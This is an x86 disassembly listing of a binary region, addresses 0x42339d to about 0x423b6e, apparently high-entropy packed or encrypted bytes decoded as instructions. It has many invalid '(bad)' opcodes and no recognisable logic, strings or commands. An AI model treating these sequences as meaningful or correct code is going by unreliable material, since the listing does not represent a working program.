  42339d:	jl     0x4233bc
  42339f:	sbb    ebp,ebp
  4233a1:	push   esi
  4233a2:	ret    
  4233a3:	popa   
  4233a4:	or     ch,dl
  4233a6:	mov    edx,?
  4233a8:	dec    eax
  4233a9:	sti    
  4233aa:	jl     0x4233c9
  4233ac:	sbb    ebp,ebp
  4233ae:	push   esi
  4233af:	ret    
  4233b0:	popa   
  4233b1:	or     ch,dl
  4233b3:	mov    edx,?
  4233b5:	dec    eax
  4233b6:	sti    
  4233b7:	jl     0x4233d6
  4233b9:	sbb    ebp,ebp
  4233bb:	push   esi
  4233bc:	ret    
  4233bd:	popa   
  4233be:	or     ch,dl
  4233c0:	mov    edx,?
  4233c2:	dec    eax
  4233c3:	sti    
  4233c4:	jl     0x4233e3
  4233c6:	sbb    ebp,ebp
  4233c8:	push   esi
  4233c9:	ret    
  4233ca:	popa   
  4233cb:	or     ch,dl
  4233cd:	mov    edx,?
  4233cf:	dec    eax
  4233d0:	sti    
  4233d1:	jl     0x4233f0
  4233d3:	pop    esi
  4233d4:	add    ebx,DWORD PTR [ebx+eax*8+0x4e]
  4233d8:	or     ch,dl
  4233da:	pushf  
  4233db:	cli    
  4233dc:	dec    eax
  4233dd:	rcr    esi,1
  4233df:	(bad)  
  4233e0:	push   0xffeea98b
  4233e5:	pop    DWORD PTR [ebp-0x175f339f]
  4233eb:	enter  0x7f88,0x9c
  4233ef:	rcr    BYTE PTR [ecx-0x659d468e],cl
  4233f5:	xchg   edi,eax
  4233f6:	lods   al,BYTE PTR ds:[esi]
  4233f7:	jno    0x4233f6
  4233f9:	(bad)  [edi]
  4233fb:	pop    esi
  4233fd:	cld    
  4233fe:	pop    eax
  4233ff:	cmp    ebx,DWORD PTR [edx-0x49512c3]
  423405:	pop    ebx
  423406:	mov    edx,0xae07b891
  42340b:	enter  0xe83a,0x51
  42340f:	out    dx,al
  423410:	stc    
  423411:	fwait
  423412:	ins    BYTE PTR es:[edi],dx
  423413:	inc    esi
  423414:	aas    
  423415:	cld    
  423416:	mov    ecx,0x3264c0aa
  42341b:	ss (bad) 
  42341d:	(bad)  
  42341e:	jbe    0x423448
  423420:	jecxz  0x423451
  423422:	popf   
  423423:	fwait
  423424:	pop    edx
  423425:	arpl   WORD PTR [eax+0x316d881c],bp
  42342b:	les    esp,FWORD PTR [eax+0x68]
  42342e:	add    al,0x5c
  423430:	clc    
  423431:	adc    al,0xfa
  423433:	rcl    BYTE PTR [edx-0x9fe093a],1
  423439:	adc    BYTE PTR [edi+0x3d1ee093],ah
  42343f:	xchg   edi,edi
  423441:	call   0x4d60d3cc
  423446:	mov    edi,0x808dd983
  42344b:	mov    BYTE PTR [edx],ah
  42344d:	in     al,dx
  42344e:	aaa    
  42344f:	sub    al,BYTE PTR gs:[ebx]
  423452:	js     0x4233f8
  423454:	ss mov ecx,0xff48bde9
  42345a:	dec    esp
  42345b:	aaa    
  42345c:	pop    ebx
  42345d:	mov    BYTE PTR [ebx-0x4],ch
  423460:	push   ecx
  423461:	into   
  423462:	leave  
  423463:	int3   
  423464:	xor    ebx,DWORD PTR [ecx+0xf843629]
  42346a:	or     ebp,DWORD PTR ss:[edi]
  42346d:	xchg   edi,eax
  42346e:	pop    ds
  42346f:	icebp  
  423470:	aaa    
  423471:	pushf  
  423472:	add    DWORD PTR [ecx],esi
  423474:	and    eax,0x734cc2f3
  423479:	xchg   BYTE PTR [eax+0x668a6de],bl
  42347f:	pop    ebp
  423480:	add    bh,BYTE PTR [edx]
  423482:	(bad)  
  423483:	cmp    eax,0x8506a70d
  423488:	cli    
  423489:	jmp    0xbf25:0x9999d63
  423490:	mov    BYTE PTR [eax],al
  423492:	(bad)  
  423493:	mov    esp,0x732385fa
  423498:	mov    al,ds:0xdca1e7ca
  42349d:	pop    ecx
  42349e:	xor    al,0xeb
  4234a0:	pop    esp
  4234a1:	lods   al,BYTE PTR ds:[esi]
  4234a2:	leave  
  4234a3:	pop    es
  4234a4:	dec    eax
  4234a5:	je     0x4234c0
  4234a7:	mov    ecx,0xc8b8e9d3
  4234ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234ad:	cwde   
  4234ae:	int3   
  4234af:	jb     0x4234b9
  4234b1:	cmovnp edi,DWORD PTR [eax+0x1d87dc35]
  4234b8:	xlat   BYTE PTR ds:[ebx]
  4234b9:	fadd   st,st(2)
  4234bb:	mov    bl,BYTE PTR cs:[ebp-0x459a7ada]
  4234c2:	dec    edi
  4234c3:	(bad)  
  4234c4:	xlat   BYTE PTR ds:[ebx]
  4234c5:	imul   ecx,DWORD PTR [ecx+ecx*2+0x36abb58e],0x6b3ac0ea
  4234d0:	xchg   BYTE PTR [edi],dh
  4234d2:	cld    
  4234d3:	leave  
  4234d4:	mov    ch,0xe3
  4234d6:	test   BYTE PTR [edx-0xd],bh
  4234d9:	sub    eax,eax
  4234db:	out    dx,al
  4234dc:	and    edi,DWORD PTR [esi+0x43]
  4234df:	mov    edi,0x5b1ac992
  4234e4:	push   esi
  4234e5:	dec    edx
  4234e6:	jge    0x42353c
  4234e8:	addr16 (bad) 
  4234ea:	push   esp
  4234eb:	pop    ebx
  4234ec:	bound  ebp,QWORD PTR fs:[edx-0x13]
  4234f0:	xor    DWORD PTR [ebx],esi
  4234f2:	mov    ebp,0xe7fff813
  4234f7:	ret    0x141f
  4234fa:	pop    ebx
  4234fb:	inc    esi
  4234fc:	mov    esp,0xcb1be51f
  423501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423502:	mov    dl,0xea
  423504:	and    al,0xe8
  423506:	jecxz  0x4234f9
  423508:	push   ss
  423509:	test   DWORD PTR [eax+0x4b],ebx
  42350c:	adc    eax,0xf76b266f
  423511:	stc    
  423512:	cli    
  423513:	retf   0x113d
  423516:	popf   
  423517:	inc    esp
  423518:	in     al,dx
  423519:	sbb    edx,DWORD PTR [ebp-0x78b799eb]
  42351f:	and    eax,0x70f5b892
  423524:	and    DWORD PTR [eax+ebp*4],ecx
  423527:	sti    
  423528:	sub    al,0xa5
  42352a:	popf   
  42352b:	add    eax,edi
  42352d:	or     DWORD PTR [ebp-0x5813257b],esi
  423533:	sbb    bh,BYTE PTR [edi+0x71]
  423536:	mov    al,ds:0x5961436c
  42353b:	mov    ecx,0xa1fd99cd
  423540:	mov    edi,0x93d2acde
  423545:	cmp    DWORD PTR [edi-0x1f09e8b8],eax
  42354b:	push   cs
  42354c:	call   0x87bafec9
  423551:	stc    
  423552:	adc    al,0xac
  423554:	test   BYTE PTR [esp+eiz*8+0x22],bh
  423558:	xchg   DWORD PTR ds:0x80ef35e7,esp
  42355e:	mov    ds:0x3bc7e89f,al
  423563:	in     al,0x81
  423565:	pop    ebx
  423567:	mov    al,ds:0xcc48bd8c
  42356c:	xchg   DWORD PTR [eax],ebx
  42356e:	inc    ebp
  42356f:	xchg   ecx,eax
  423570:	pushf  
  423571:	sti    
  423572:	aam    0xe9
  423574:	mov    esp,ecx
  423576:	cmp    bh,BYTE PTR [ebx+ebp*8+0x14]
  42357a:	xor    DWORD PTR [ebp+0x0],ebp
  42357d:	xchg   esp,edx
  42357f:	sub    ebx,DWORD PTR [edx+ecx*1+0x1bd6d6ec]
  423586:	mov    ebx,0x53cdad55
  42358b:	mov    bl,0x66
  42358d:	jle    0x423550
  42358f:	push   esi
  423590:	ss mov esi,0x48a6bfa6
  423596:	mov    esi,0x3bc48d14
  42359b:	push   ebx
  42359c:	es gs xchg ebp,eax
  42359f:	mov    ebx,0x6c544272
  4235a4:	aaa    
  4235a5:	push   edi
  4235a6:	xchg   esi,eax
  4235a7:	add    eax,0xbc4b4c09
  4235ac:	mov    ch,al
  4235ae:	mov    esi,0x755e010d
  4235b3:	add    ah,BYTE PTR [ecx-0x6b42b7f4]
  4235b9:	push   esp
  4235ba:	addr16 js 0x42362f
  4235bd:	loope  0x4235b4
  4235bf:	push   0xaeb9f9da
  4235c4:	rcr    BYTE PTR [ebx+0x15],0xde
  4235c8:	hlt    
  4235c9:	ins    DWORD PTR es:[edi],dx
  4235ca:	daa    
  4235cb:	hlt    
  4235cc:	cmp    BYTE PTR [ebx+0x7f],dl
  4235cf:	clc    
  4235d0:	cmp    cl,BYTE PTR [ebx-0x6a]
  4235d3:	sub    bl,ch
  4235d5:	push   eax
  4235d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235d7:	jnp    0x4235db
  4235d9:	jmp    0x5ad4:0x96f1a571
  4235e0:	adc    eax,DWORD PTR [ecx]
  4235e2:	and    al,0x11
  4235e4:	iret   
  4235e5:	outs   dx,BYTE PTR ds:[esi]
  4235e6:	cmp    ch,BYTE PTR [eax+0x70]
  4235e9:	dec    eax
  4235ea:	xchg   ebp,eax
  4235eb:	pop    edi
  4235ec:	jg     0x423613
  4235ee:	sub    al,BYTE PTR [ebx+0x19]
  4235f1:	popa   
  4235f2:	and    al,0xdd
  4235f4:	bnd jae 0x42364d
  4235f7:	xchg   DWORD PTR [ebx],edi
  4235f9:	mov    al,0x1e
  4235fb:	push   esi
  4235fc:	push   0x675bb931
  423601:	or     DWORD PTR [ebp-0x70],esi
  423604:	pop    ds
  423605:	xchg   ebp,eax
  423606:	sub    ecx,DWORD PTR ds:0xf973662
  42360c:	add    bh,BYTE PTR [edx]
  42360e:	inc    edx
  42360f:	push   ss
  423610:	and    al,0xcc
  423612:	lds    esi,FWORD PTR [eax+0x77]
  423615:	mov    ecx,0x79809628
  42361a:	and    BYTE PTR [edi-0x781d0930],dh
  423620:	xor    bh,BYTE PTR [ecx+0x2f20679b]
  423626:	ss push 0x10
  423629:	les    ebp,FWORD PTR [ebx+0x55]
  42362c:	dec    edi
  42362d:	pushf  
  42362e:	xchg   WORD PTR [ebp-0x2b],ax
  423632:	imul   eax,DWORD PTR [esi+0xea87841],0xb0bf3e23
  42363c:	inc    ebp
  42363d:	adc    BYTE PTR [eax-0x6b],ch
  423640:	inc    esi
  423641:	jne    0x423664
  423643:	and    al,0x2f
  423645:	jmp    DWORD PTR [edx]
  423647:	mov    esp,0xaf4fbef6
  42364c:	mov    ebp,0x338440fa
  423651:	aad    0x38
  423653:	and    al,0x11
  423655:	fwait
  423656:	outs   dx,DWORD PTR ds:[esi]
  423658:	jmp    0x562:0xf7513e74
  42365f:	pop    ebx
  423660:	pop    ebx
  423661:	push   ss
  423662:	pusha  
  423663:	dec    esp
  423664:	fdiv   st,st(6)
  423666:	arpl   WORD PTR [ecx+0x173020ea],di
  42366c:	lods   eax,DWORD PTR ds:[esi]
  42366d:	push   esi
  42366e:	push   eax
  42366f:	pop    esp
  423670:	or     BYTE PTR [ecx-0x26152275],ch
  423676:	and    al,0xdf
  423678:	add    ecx,DWORD PTR [esi+0x6c]
  42367b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42367c:	aam    0x4c
  42367e:	add    bl,BYTE PTR [esi]
  423680:	mov    dl,0x7f
  423682:	stos   DWORD PTR es:[edi],eax
  423683:	push   es
  423684:	sub    eax,0x9a6735f9
  423689:	mov    dh,0x79
  42368b:	pushf  
  42368c:	imul   esi,ebx,0x28
  42368f:	cdq    
  423690:	imul   eax,DWORD PTR [eax],0xe
  423693:	(bad)  
  423694:	cs push 0x23
  423697:	pop    ebp
  423698:	cmp    cl,BYTE PTR [edi]
  42369a:	mov    edx,0x79f71e9c
  42369f:	fild   WORD PTR [ecx-0x1322a8]
  4236a5:	inc    eax
  4236a6:	mov    dl,0xe3
  4236a8:	jo     0x423705
  4236aa:	pop    ds
  4236ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236ac:	test   al,0xdb
  4236ae:	nop
  4236af:	out    0xa3,al
  4236b1:	xchg   ebp,eax
  4236b2:	xchg   edi,eax
  4236b3:	pop    eax
  4236b4:	mov    edi,0x570f3f4
  4236b9:	adc    al,0xf5
  4236bb:	cmp    ecx,DWORD PTR [esp+eax*2]
  4236be:	and    BYTE PTR [esi+eiz*4-0x61],bh
  4236c2:	aaa    
  4236c3:	fist   DWORD PTR [ebp-0x655509]
  4236c9:	mov    ah,0x43
  4236cb:	sti    
  4236cc:	sbb    eax,0x25ee12a9
  4236d1:	aaa    
  4236d2:	jmp    0xaf0f:0xd3b8dd4d
  4236d9:	and    dl,BYTE PTR [ebx+0x3e]
  4236dc:	jge    0x4236d1
  4236de:	inc    esp
  4236df:	xchg   esi,eax
  4236e0:	xchg   DWORD PTR [edi-0x32],ebp
  4236e3:	loopne 0x4236ba
  4236e5:	xlat   BYTE PTR ds:[ebx]
  4236e6:	pushf  
  4236e7:	in     al,dx
  4236e8:	test   BYTE PTR [ebx-0x64],bh
  4236eb:	je     0x42372d
  4236ed:	dec    esi
  4236ee:	or     al,BYTE PTR [ecx+0x1a]
  4236f1:	and    BYTE PTR es:[ebx-0x2d],0xff
  4236f6:	mov    ch,0xeb
  4236f8:	pop    ebp
  4236f9:	popa   
  4236fa:	push   esp
  4236fb:	lods   al,BYTE PTR ds:[esi]
  4236fc:	test   BYTE PTR [ebp+0x8],dh
  4236ff:	mov    ecx,0x53bbf60f
  423704:	ret    0x3741
  423707:	retf   
  423708:	lods   al,BYTE PTR ds:[esi]
  423709:	pop    ebx
  42370a:	sub    dl,BYTE PTR [eax-0x55f36a97]
  423710:	std    
  423711:	pop    esp
  423712:	mov    eax,0xc5ed1d81
  423717:	leave  
  423718:	xchg   DWORD PTR [ebx],esp
  42371a:	aam    0xdc
  42371c:	scas   eax,DWORD PTR es:[edi]
  42371d:	call   0x10186a6f
  423722:	and    esp,ebx
  423724:	mov    ds:0xcd2d86c9,al
  423729:	push   ecx
  42372a:	jecxz  0x4236d3
  42372c:	out    0xe1,al
  42372e:	inc    dh
  423730:	or     BYTE PTR [eax*2-0x7818e435],dh
  423737:	jl     0x42376c
  423739:	xchg   ecx,eax
  42373a:	test   esi,0x1980518d
  423740:	ret    
  423741:	cmp    edx,edx
  423743:	pop    ebp
  423744:	and    eax,0x9d92a3c6
  423749:	repz push ds
  42374b:	das    
  42374c:	dec    ecx
  42374d:	jecxz  0x4236e3
  42374f:	js     0x4236d4
  423751:	dec    eax
  423752:	add    al,bh
  423754:	mov    ebp,0xcda2ae8c
  423759:	sub    bl,BYTE PTR [ecx+edx*2-0x5a37eac4]
  423760:	cmp    BYTE PTR [ecx+0x6],bl
  423763:	les    ebx,FWORD PTR [esi+0x660bbea1]
  423769:	aad    0x4e
  42376b:	mov    cl,0x70
  42376d:	jg     0x423765
  42376f:	mov    esp,0x886fd4d6
  423774:	mov    ebx,0x1343ad70
  423779:	jl     0x423773
  42377b:	mov    esp,0x60f3aca3
  423780:	ficomp WORD PTR [ecx-0x716ee2b6]
  423786:	retf   
  423787:	loop   0x4237ab
  423789:	out    dx,eax
  42378a:	or     al,0x91
  42378c:	sub    BYTE PTR [ecx],ah
  42378e:	mov    bh,BYTE PTR [ebp-0xf]
  423791:	adc    DWORD PTR [ecx-0x5],ebx
  423794:	ds (bad) 
  423796:	std    
  423797:	jbe    0x4237a7
  423799:	fwait
  42379a:	lds    ebx,FWORD PTR [eax+0x6ad0aa83]
  4237a0:	mov    ch,0xf0
  4237a2:	loop   0x4237bd
  4237a4:	add    al,0x36
  4237a6:	pop    ecx
  4237a7:	xchg   ebp,eax
  4237a8:	mov    BYTE PTR [edi+0x5],0x68
  4237ac:	dec    edi
  4237ad:	mov    ch,0xb6
  4237af:	sar    DWORD PTR [ebx-0x519674c0],1
  4237b5:	fwait
  4237b6:	and    BYTE PTR [edx],ch
  4237b8:	cmp    esi,DWORD PTR [ecx-0x4b9a1fd0]
  4237be:	lea    esi,[esi]
  4237c0:	push   ebx
  4237c1:	jb     0x42378e
  4237c3:	push   ebp
  4237c4:	aam    0x1e
  4237c6:	pop    ss
  4237c7:	push   0x639dd185
  4237cc:	and    BYTE PTR [esi-0x3c3dd48d],bl
  4237d2:	and    DWORD PTR [esi+0x90dad31],edi
  4237d8:	inc    ecx
  4237d9:	xor    eax,0x13713a7d
  4237de:	pop    ecx
  4237df:	in     eax,0xbe
  4237e1:	neg    DWORD PTR [edx]
  4237e3:	sub    al,0x20
  4237e5:	mov    BYTE PTR ds:0x76e307ca,dh
  4237eb:	ins    DWORD PTR es:[edi],dx
  4237ec:	int    0x5d
  4237ee:	mov    ebx,0x477c1294
  4237f3:	xchg   ebx,eax
  4237f4:	xor    eax,0xbc8bb3c
  4237f9:	ds jo  0x4237e6
  4237fc:	hlt    
  4237fd:	not    ebx
  4237ff:	mov    ds:0xacb46df2,eax
  423804:	mov    al,0x87
  423806:	sub    DWORD PTR ds:0xb01e9f70,ebx
  42380c:	outs   dx,BYTE PTR ds:[esi]
  42380d:	aas    
  42380e:	inc    ebp
  42380f:	not    BYTE PTR [esi-0x672f8c2d]
  423815:	push   ds
  423816:	out    dx,eax
  423817:	xor    dh,dh
  423819:	ret    
  42381a:	loope  0x4237bf
  42381c:	daa    
  42381d:	xchg   edx,eax
  42381e:	icebp  
  42381f:	sahf   
  423820:	ins    DWORD PTR es:[edi],dx
  423821:	fs into 
  423823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423824:	in     eax,dx
  423825:	mov    bh,0x98
  423827:	jmp    0xf44a:0x8f908066
  42382e:	pop    ds
  42382f:	mov    bh,0xfc
  423831:	in     al,dx
  423832:	push   ss
  423833:	mov    eax,ds:0x728f6a13
  423838:	ds inc esp
  42383a:	cdq    
  42383b:	sub    eax,0x1ba3b927
  423840:	dec    ecx
  423841:	inc    ecx
  423842:	pop    esp
  423843:	shl    BYTE PTR [ebx+0x395a4154],0x7e
  42384a:	sbb    eax,0xd4d06d41
  42384f:	shl    BYTE PTR [ecx+0xf83a38e],0xc4
  423856:	(bad)  
  423857:	push   es
  423858:	mov    DWORD PTR [eax+0x20aaf48b],0xe2fef768
  423862:	leave  
  423863:	adc    BYTE PTR [edx+0x4bdbfd0d],al
  423869:	ja     0x42382d
  42386b:	enter  0xad33,0x49
  42386f:	fcmovb st,st(2)
  423871:	cmp    eax,0x2134e87
  423876:	(bad)  
  423877:	xor    ebx,DWORD PTR [ecx-0x8]
  42387a:	gs inc esp
  42387c:	mov    al,ds:0x2d456142
  423881:	loopne 0x4238c7
  423883:	mov    dl,0x47
  423885:	push   eax
  423886:	mov    al,0xb0
  423888:	div    DWORD PTR [edi]
  42388a:	mov    ebp,0xd26fdaa9
  42388f:	mov    cl,0x2e
  423891:	in     eax,dx
  423892:	in     eax,0x8f
  423894:	dec    esp
  423895:	add    al,0x8f
  423897:	loopne 0x423900
  423899:	aaa    
  42389a:	cwde   
  42389b:	clc    
  42389c:	mul    BYTE PTR [ecx]
  42389e:	inc    eax
  42389f:	retf   
  4238a0:	shr    ah,0x64
  4238a3:	mov    ds:0x5c09eef3,al
  4238a8:	jno    0x42391d
  4238aa:	push   ss
  4238ab:	mov    ebp,DWORD PTR [esi+0x15]
  4238ae:	sbb    BYTE PTR [edi+0x11],0xa7
  4238b2:	mov    ebx,edx
  4238b4:	xor    eax,0x1de4a8cc
  4238b9:	aaa    
  4238ba:	mov    ch,0x8e
  4238bc:	xor    bl,BYTE PTR [ecx+0x7b08b1f6]
  4238c2:	test   al,0x32
  4238c4:	lods   eax,DWORD PTR ds:[esi]
  4238c5:	inc    ebx
  4238c6:	mov    ecx,0xb29b19d9
  4238cb:	dec    BYTE PTR [eax-0x2c]
  4238ce:	inc    esp
  4238cf:	fwait
  4238d0:	dec    ebp
  4238d1:	out    0x8d,al
  4238d3:	stos   DWORD PTR es:[edi],eax
  4238d4:	call   0x536c:0x7783f31a
  4238db:	pop    edx
  4238dc:	cmc    
  4238dd:	idiv   bl
  4238df:	or     eax,0x107073e7
  4238e4:	scas   eax,DWORD PTR es:[edi]
  4238e5:	pop    ss
  4238e6:	addr16 cli 
  4238e8:	in     al,0x6d
  4238ea:	sub    ecx,esi
  4238ec:	lods   eax,DWORD PTR ds:[esi]
  4238ed:	(bad)  
  4238ee:	lods   al,BYTE PTR ds:[esi]
  4238ef:	pop    ebx
  4238f0:	push   es
  4238f1:	jp     0x4238c7
  4238f3:	push   eax
  4238f4:	mov    bh,0x97
  4238f6:	sbb    BYTE PTR [esi-0x7f],bh
  4238f9:	or     dl,bh
  4238fb:	in     al,0xf0
  4238fd:	lock sar bl,cl
  423900:	pop    edi
  423901:	shr    DWORD PTR [ebx-0x2b00fc5e],1
  423907:	pop    ds
  423908:	out    dx,al
  423909:	popa   
  42390a:	add    ecx,0x97b9c4d8
  423910:	sub    eax,0xa6a78315
  423915:	pop    edi
  423916:	xchg   edx,eax
  423917:	pop    es
  423918:	sbb    ebp,esi
  42391a:	lea    ecx,[edi-0xe73e635]
  423920:	mov    eax,0xf9422370
  423925:	leave  
  423926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423927:	sub    eax,0xe71a250f
  42392c:	inc    ebx
  42392d:	inc    esi
  42392e:	dec    DWORD PTR [ecx]
  423930:	inc    ecx
  423931:	iret   
  423932:	in     eax,dx
  423933:	imul   ebx,esi,0x4ce312c3
  423939:	fnstsw WORD PTR [ebx-0x2fe9537d]
  42393f:	fcmovnbe st,st(1)
  423941:	pop    ds
  423942:	mov    dl,0xe9
  423944:	mov    ah,0x1b
  423946:	sbb    eax,0x3f07ceed
  42394b:	clc    
  42394c:	fst    DWORD PTR [ecx]
  42394e:	loopne 0x423922
  423950:	pusha  
  423951:	clc    
  423952:	mov    edx,DWORD PTR [edx+0x510c560f]
  423958:	(bad)  
  423959:	xor    eax,esi
  42395b:	test   al,cl
  42395d:	sbb    al,0x62
  42395f:	hlt    
  423960:	mov    ds:0x3d36b5aa,al
  423965:	xor    al,0x31
  423967:	clc    
  423968:	or     al,0x35
  42396a:	adc    DWORD PTR [ebp+0x59],esp
  42396d:	mov    edi,DWORD PTR [edx]
  42396f:	mov    edi,DWORD PTR ds:0x87e9c0e2
  423975:	mov    eax,ds:0x6c2da12d
  42397a:	xchg   DWORD PTR [edx],esi
  42397c:	(bad)  
  42397d:	jmp    0xcd2a:0x73fa6d94
  423984:	in     al,dx
  423985:	jns    0x4239cc
  423987:	mov    ah,dh
  423989:	mov    esp,0xfda87194
  42398e:	cwde   
  42398f:	jb     0x4239cc
  423991:	das    
  423992:	inc    eax
  423993:	fucomip st,st(2)
  423995:	addr16 int 0x68
  423998:	pop    eax
  423999:	stos   DWORD PTR es:[edi],eax
  42399a:	inc    ecx
  42399b:	pop    edx
  42399c:	rcr    BYTE PTR [edx-0x193eeb4d],cl
  4239a2:	sub    al,BYTE PTR [ecx-0x70]
  4239a5:	(bad)  
  4239a6:	loop   0x423981
  4239a8:	out    dx,al
  4239a9:	sar    DWORD PTR [esi-0x12],0x63
  4239ad:	dec    edi
  4239ae:	fnstcw WORD PTR [ebp+0x38e300ea]
  4239b4:	or     ebp,DWORD PTR [ebp+ebp*8+0x69]
  4239b8:	jno    0x42394f
  4239ba:	mov    eax,0xb2562124
  4239bf:	mov    ds:0x43522bf9,al
  4239c4:	push   0xcfc29fc7
  4239c9:	lods   eax,DWORD PTR ds:[esi]
  4239ca:	in     al,0x43
  4239cc:	cmp    cl,BYTE PTR [ebx-0x3d943b4b]
  4239d2:	cdq    
  4239d3:	jp     0x423a05
  4239d5:	fcom   DWORD PTR [ecx]
  4239d7:	lods   eax,DWORD PTR ss:[esi]
  4239d9:	mov    edx,0x37b27b3e
  4239de:	mov    bl,0x43
  4239e0:	std    
  4239e1:	push   ds
  4239e2:	mov    ebx,0xa8324aea
  4239e7:	iret   
  4239e8:	jp     0x423a39
  4239ea:	sbb    ebp,DWORD PTR [edx]
  4239ec:	repnz popf 
  4239ee:	fisttp WORD PTR [esi]
  4239f0:	push   edx
  4239f1:	stos   DWORD PTR es:[edi],eax
  4239f2:	(bad)  
  4239f3:	pop    eax
  4239f4:	mov    edi,0xdf62100e
  4239f9:	pop    ss
  4239fa:	loop   0x4239f1
  4239fc:	sub    edi,DWORD PTR [esi+0xe9e20c6]
  423a02:	call   FWORD PTR [ecx]
  423a04:	jmp    0xd261:0x69b1aee
  423a0b:	push   cs
  423a0c:	inc    ecx
  423a0d:	mov    cl,0xc
  423a0f:	push   cs
  423a10:	cmp    WORD PTR [ecx+0x7fab76e0],0x66
  423a18:	add    bh,bh
  423a1a:	xchg   BYTE PTR [ebx+0x36],bh
  423a1d:	lahf   
  423a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a1f:	mov    ah,0x2c
  423a21:	sub    esp,esp
  423a23:	adc    cl,cl
  423a25:	sbb    dh,BYTE PTR ds:0x63a8bf31
  423a2b:	sti    
  423a2c:	mov    DWORD PTR [ecx-0x6f],edx
  423a2f:	dec    ecx
  423a30:	(bad)  
  423a31:	jp     0x423a53
  423a33:	xor    esp,esi
  423a35:	pushf  
  423a36:	(bad)  [esi+0x52]
  423a39:	xchg   DWORD PTR [edi+0x37],edx
  423a3c:	loop   0x423a45
  423a3e:	cdq    
  423a3f:	mul    DWORD PTR [edx+0x2fc50f41]
  423a45:	dec    ecx
  423a46:	lods   al,BYTE PTR ds:[esi]
  423a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a48:	daa    
  423a49:	lds    esi,FWORD PTR [edi]
  423a4b:	and    eax,0x2a4d8d1e
  423a50:	pop    esp
  423a51:	retf   
  423a52:	neg    BYTE PTR [edx-0x57]
  423a55:	aas    
  423a56:	mov    ch,0x34
  423a58:	pusha  
  423a59:	mov    DWORD PTR [esi+ebx*8+0x3ab5af89],edx
  423a60:	inc    edi
  423a61:	scas   eax,DWORD PTR es:[edi]
  423a62:	hlt    
  423a63:	imul   eax,DWORD PTR [ebp+0x46d0b4e0],0xa
  423a6a:	fwait
  423a6b:	add    eax,0x10bd784
  423a70:	shr    BYTE PTR [ecx],0x96
  423a73:	mov    ds:0x1a54ac1e,eax
  423a78:	xor    ah,bh
  423a7a:	push   esp
  423a7b:	pushf  
  423a7c:	js     0x423af2
  423a7e:	in     eax,dx
  423a7f:	pop    edi
  423a80:	retf   0x606a
  423a83:	repnz aad 0xad
  423a86:	retf   
  423a87:	push   ecx
  423a88:	ins    DWORD PTR es:[edi],dx
  423a89:	jbe    0x423a7c
  423a8b:	rcr    esi,cl
  423a8d:	or     dl,bl
  423a8f:	aam    0x4f
  423a91:	push   edi
  423a92:	outs   dx,BYTE PTR ds:[esi]
  423a93:	scas   al,BYTE PTR es:[edi]
  423a94:	shl    BYTE PTR [edi+0x46],1
  423a97:	pusha  
  423a98:	mov    esi,0xd5e632fb
  423a9d:	fwait
  423a9e:	out    dx,eax
  423a9f:	cmovnp esp,DWORD PTR [edi-0x76]
  423aa3:	xchg   esi,eax
  423aa4:	aad    0x9
  423aa6:	in     al,0x24
  423aa8:	frstor [edi-0x41]
  423aab:	imul   edx,DWORD PTR [ebx-0x6c],0x23c344bd
  423ab2:	test   dl,0xd4
  423ab5:	cdq    
  423ab6:	lahf   
  423ab7:	stos   BYTE PTR es:[edi],al
  423ab8:	mov    edx,0xf930c913
  423abd:	jnp    0x423b22
  423abf:	(bad)  
  423ac1:	push   0x48
  423ac3:	sbb    bh,al
  423ac5:	push   edx
  423ac6:	out    0xb1,eax
  423ac8:	repz ficom DWORD PTR fs:[ecx+esi*8-0x71d75564]
  423ad1:	mov    ch,0x71
  423ad3:	mul    BYTE PTR [esi+ebx*8+0x2eddd81a]
  423ada:	inc    ebx
  423adb:	das    
  423adc:	mov    edi,0x3372b322
  423ae1:	mov    ebx,0xfec3ba69
  423ae6:	xchg   edi,eax
  423ae7:	test   DWORD PTR [eax+0x3a285c70],0xe420f4cd
  423af1:	jecxz  0x423b48
  423af3:	mov    ebp,DWORD PTR [eax+ebp*4-0x1d9ba3d2]
  423afa:	jge    0x423aaa
  423afc:	idiv   DWORD PTR [edx-0x39482cb7]
  423b02:	addr16 out 0x4f,al
  423b05:	push   ss
  423b06:	pop    DWORD PTR [esi]
  423b08:	pushf  
  423b09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b0a:	rol    DWORD PTR [ebp+0x1e],1
  423b0d:	or     al,0xd7
  423b0f:	pop    esi
  423b10:	xor    esi,edi
  423b12:	pop    ss
  423b13:	ja     0x423afd
  423b15:	stos   DWORD PTR es:[edi],eax
  423b16:	outs   dx,BYTE PTR ds:[esi]
  423b17:	cwde   
  423b18:	leave  
  423b19:	sahf   
  423b1a:	loope  0x423ac9
  423b1c:	lock mov edi,0x2315d9f
  423b22:	jge    0x423b49
  423b24:	pop    ds
  423b25:	pop    ds
  423b26:	sahf   
  423b27:	or     edx,DWORD PTR [ebx]
  423b29:	jb     0x423ab1
  423b2b:	int    0xc2
  423b2d:	les    cx,DWORD PTR [esi]
  423b30:	fucomp st(1)
  423b32:	jmp    0x423b4c
  423b34:	xor    DWORD PTR [edi-0x4d],ecx
  423b37:	dec    edi
  423b38:	out    0x4f,eax
  423b3a:	fidiv  DWORD PTR [esi-0x3170d7d9]
  423b40:	mov    eax,0x33024884
  423b45:	jl     0x423b62
  423b47:	pop    ebp
  423b48:	mov    dl,0x52
  423b4a:	xchg   ecx,eax
  423b4b:	and    dh,dl
  423b4d:	sub    DWORD PTR [esi-0x63],esi
  423b50:	dec    esi
  423b51:	shr    eax,1
  423b53:	shr    al,1
  423b55:	mov    bl,0xca
  423b57:	retf   0x3be6
  423b5a:	icebp  
  423b5b:	mov    al,0x9d
  423b5d:	scas   eax,DWORD PTR es:[edi]
  423b5e:	cmp    BYTE PTR [eax],dl
  423b60:	pop    es
  423b61:	and    eax,0x99fa7c80
  423b66:	sub    eax,DWORD PTR [ecx]
  423b68:	(bad)  
  423b69:	ret    
  423b6a:	in     eax,0x7f
  423b6c:	jge    0x423bd5
  423b6e:	arpl   WORD PTR [esi+0xf31d684],ax
